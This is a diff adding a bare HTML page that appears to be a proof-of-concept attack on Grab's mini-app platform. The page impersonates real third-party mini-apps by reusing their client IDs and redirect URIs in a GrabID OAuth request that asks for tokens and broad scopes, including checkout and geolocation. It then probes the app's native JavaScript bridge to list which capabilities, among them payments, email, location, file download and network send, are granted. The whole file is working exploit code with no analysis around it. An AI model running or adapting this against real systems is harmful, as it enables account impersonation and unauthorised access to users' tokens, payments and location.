@@ -1,0 +1,82 @@
+<pre id="o">loading...</pre>
+<button onclick="probe()">Probe JavaScript Bridge</button>
+<iframe id="f" width="100%" height="500" style="display:none"></iframe>
+<pre id="p"></pre>
+<script>
+var tiles={
+"57d555fb5aeb442bacd8b0683bc94404":"https://miniapp-sample.grab.com",
+"662ec9fe067e4326b6ae0105b7cf540b":"https://grab.drivelah.sg",
+"c1de46cbdd5b494da253d3c860995885":"https://m.hellobike.com/AppHelloBikeGlobalGrabH5/sea_grab.html",
+"4547df38b94d47478062e8396479cef3":"https://flutter.firsty.app/authorize/grab",
+"49118dc36a3e438e897344a036620903":"https://game.jolibox.com/entry/grab/sg",
+"02917d84a8d94faea272b031e85105aa":"https://drama.jolibox.com/entry/grab/sg",
+"7662a018a45d43308fe9bdd374b0547a":"https://app-grab.redbus.sg/authcallback",
+"a0629feb1f4b40349a0b69b971bf7cfa":"https://cbmplus.creditbureau.com.my/get-started-grab-home",
+"4049b8b349984c898d3105ec90262845":"https://grabtravel.grab.com/grab-sso",
+"3c0a913283904301b4011998f705ad00":"https://grab.fantacore.io",
+"f2be5ef593fd427d8179bcebdc3fd4d0":"https://grabc.policystreet.com"
+};
+
+var o=document.getElementById("o");
+var cid=new URLSearchParams(location.search).get("client_id");
+
+if(!cid||!tiles[cid]){
+  o.textContent="ClientID not found: "+(cid||"(none)")+"\n\nValid:\n"+Object.keys(tiles).join("\n");
+}else{
+  var redir=tiles[cid];
+  var nonce=hex(rnd(16)),state=hex(rnd(16)),verifier=b64u(rnd(64));
+  sha256(verifier).then(function(challenge){
+    var url="https://api.grab.com/grabid/v1/oauth2/authorize"
+      +"?client_id="+cid
+      +"&redirect_uri="+encodeURIComponent(redir)
+      +"&response_type="+encodeURIComponent("id_token token")
+      +"&scope=openid+phone+profile.read+mobile.geolocation+mobile.checkout+mobile.cx.miniapp+mobile.storage"
+      +"&state="+state+"&nonce="+nonce
+      +"&code_challenge="+challenge+"&code_challenge_method=S256";
+
+    o.textContent="client_id: "+cid+"\nredirect: "+redir+"\nstate: "+state+"\nverifier: "+verifier+"\n\nLoading consent iframe...";
+    var f=document.getElementById("f");
+    f.style.display="block";
+    f.src=url;
+  });
+}
+
+function rnd(n){var a=new Uint8Array(n);crypto.getRandomValues(a);return a}
+function hex(a){return Array.from(a,function(b){return b.toString(16).padStart(2,"0")}).join("")}
+function b64u(a){return btoa(String.fromCharCode.apply(null,a)).replace(/=/g,"").replace(/\+/g,"-").replace(/\//g,"_")}
+function sha256(s){return crypto.subtle.digest("SHA-256",new TextEncoder().encode(s)).then(function(h){return b64u(new Uint8Array(h))})}
+
+// bridge
+function call(mod,method,params,cb){
+  var name=mod+"_"+method+"Callback_"+Date.now();
+  window[name]=function(r){cb(r);delete window[name]};
+  window[mod][method](JSON.stringify({callback:name,method:method,module:mod,parameters:params||{}}));
+}
+
+var scopes=[
+  ["identity","authorize"],["checkout","triggerCheckout"],["profile","fetchEmail"],
+  ["profile","verifyEmail"],["network","send"],["location","getCoordinate"],
+  ["location","getCountryCode"],["storage","setString"],["storage","getString"],
+  ["container","getSessionParams"],["container","sendAnalyticsEvent"],
+  ["camera","scanQRCode"],["device","isEsimSupported"],["file","downloadFile"]
+];
+
+function probe(){
+  var p=document.getElementById("p");
+  p.textContent="[1] ScopeModule.reloadScopes...\n";
+  call("ScopeModule","reloadScopes",{},function(r){
+    p.textContent+="    → "+r.status_code+"\n\n[2] hasAccessTo:\n";
+    var i=0;
+    function next(){
+      if(i>=scopes.length)return;
+      var s=scopes[i];i++;
+      call("ScopeModule","hasAccessTo",{module:s[0],method:s[1]},function(r){
+        var ok=r.status_code===200&&r.result===true;
+        p.textContent+=(ok?"  ✓ ":"  ✗ ")+s[0]+"."+s[1]+" → "+(ok?"GRANTED":r.status_code)+"\n";
+        next();
+      });
+    }
+    next();
+  });
+}
+</script>
